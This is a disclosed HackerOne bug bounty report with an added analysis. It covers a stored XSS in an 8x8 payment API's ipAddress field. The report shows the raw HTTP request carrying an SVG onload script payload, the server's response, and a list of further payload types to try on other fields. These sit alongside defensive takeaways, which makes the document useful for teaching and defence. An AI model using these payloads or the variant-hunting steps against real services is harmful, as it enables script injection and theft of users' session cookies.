# Stored XSS via IP Address Field in Payment Method Endpoint

## Metadata
- **Source:** HackerOne
- **Report:** 2078490 | https://hackerone.com/reports/2078490
- **Submitted:** 2023-07-20
- **Reporter:** pentestor
- **Program:** 8x8
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Unsafe HTML Response
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in the payment method patching endpoint where user-supplied IP address data is stored and later reflected in an HTML response without proper sanitization. An attacker can inject malicious JavaScript via the patchPaymentMethod API which executes when the payment info is retrieved via the paymentInfoById endpoint.

## Attack scenario
1. Attacker identifies the PATCH /api/patchPaymentMethod/{ID} endpoint accepts ipAddress parameter
2. Attacker crafts malicious payload with SVG/JavaScript code in the ipAddress field
3. Attacker sends POST request with payload; server accepts and stores the malicious data despite 400 response
4. Victim or admin retrieves payment information via GET /api/paymentInfoById/{ID}
5. Server returns response with Content-Type: text/html;charset=UTF-8 containing stored XSS payload
6. Victim's browser executes injected JavaScript in security context of application domain, stealing cookies/session tokens

## Root cause
The application fails to properly validate and sanitize user input in the ipAddress field before storage, and fails to HTML-encode output when rendering the data in HTML context. The endpoint accepts malicious payloads and returns them with HTML content-type without escaping.

## Attacker mindset
Exploiting insufficient input validation and output encoding in user-controlled fields. Recognizing that data persists server-side despite validation errors, and that HTML content-type responses enable JavaScript execution. Leveraging this for session hijacking via cookie theft.

## Defensive takeaways
- Implement strict whitelist validation for IP address format (validate against RFC 3986 IPv4/IPv6 patterns)
- Apply HTML entity encoding to all user-controlled data before rendering in HTML context
- Set Content-Type to application/json for API responses rather than text/html
- Implement Content-Security-Policy headers to restrict inline script execution
- Use parameterized output encoding based on context (HTML, JavaScript, URL, etc.)
- Perform input validation on both client and server side
- Store validation metadata and reject payloads with suspicious patterns early in request processing

## Variant hunting
Test other user-controlled fields (callBackURL, phone numbers, addresses) for XSS in same endpoint
Check if other payment-related endpoints (patchPaymentInfo, updatePayment) have similar issues
Test different XSS payloads: IMG, IFRAME, event handlers, data URIs
Verify if vulnerability affects other content types or export functions (PDF, CSV generation)
Check if stored data can be injected into email notifications or admin dashboards
Test for second-order XSS in related endpoints that consume payment data

## MITRE ATT&CK
- T1190
- T1566
- T1083
- T1005
- T1041
- T1071

## Notes
The writeup shows the researcher received a 400 Bad Request response but the payload was still stored, suggesting asynchronous processing or inconsistent validation between acceptance and storage layers. The 400 response may have confused some security teams into believing the input was rejected. The use of text/html content-type for API responses is a critical configuration issue that enables XSS exploitation.

## Full report
<details><summary>Expand</summary>

## Summary:
hey , 
i found a stored  xss at `https://██████.8x8.com/api/██████mentInfoById/ID` , when i analysis javascript code i understand user can modify her ip address with endpoint `https://███.8x8.com/api/patchPaymentMethod/ID` , next point i understand when we open    `https://████████.8x8.com/api/██████████mentInfoById/ID` server set `Content-Type: text/html;charset=UTF-8` , this was interesting point , then i modify ip address with this request:
```
POST /api/patchPaymentMethod/█████████ HTTP/2
Host: ███.8x8.com
Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fbp=fb.1.1689701587161.1730712436; __cf_bm=MloB4oUJmeviUXpE1GRUn8TtqbE4CwVEttuZr9tUrOQ-1689845706-0-AWJDz0q9F1c0CmKcbShEYyS7Qqsfd88Gb9W9YsIXUoHhnP/aHA+wGRccAnb8GxD1HBTGXJ71aHh7XzOojjLP/sg=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 112

{
              "ipAddress": "<svg on onload=(alert)(document.domain)>",
"callBackURL":"dssdsd"
            }
```
now i get response : 
```
HTTP/2 400 Bad Request
Date: Thu, 20 Jul 2023 23:30:32 GMT
Content-Length: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Expires: 0
Pragma: no-cache
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Gk-Traceid: e97be98a-d5e6-4fce-a6a5-4d5f6d28b02a
X-Regional-Id: usw2-gk-65dc71e19a79
X-Served-Epoch: 1689895832189
X-Xss-Protection: 1; mode=block
Cf-Cache-Status: DYNAMIC
Set-Cookie: __cf_bm=7dklJH6I0nIayzUSs2ga_6bhxG_AZTclwDwaUIaKeBQ-1689895832-0-AQvIhwqEdRP3rLeIkHe1u4gqwspbam+/6s7/WEIOEsrvvvpuOSaaBNi36GsWEVNOGQWbRBz4Z89eCgjOTdOWGv0=; path=/; expires=Fri, 21-Jul-23 00:00:32 GMT; domain=.8x8.com; HttpOnly; Secure; SameSite=None
Server: cloudflare
Cf-Ray: 7e9efe156adf41f9-EWR


```

then i check url : https://█████████.8x8.com/api/██████████mentInfoById/████ 
and i seen ip address updated and █████load successfully executed : 
█████████
  
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. open url : https://███.8x8.com/api/████mentInfoById/█████ 
  1. you can see my injected ████████load executed :D 

## Supporting Material/References:
███

## Impact

Stealing cookies and executed javascript in victim browser

</details>

---
*Analysed by Claude on 2026-05-12*
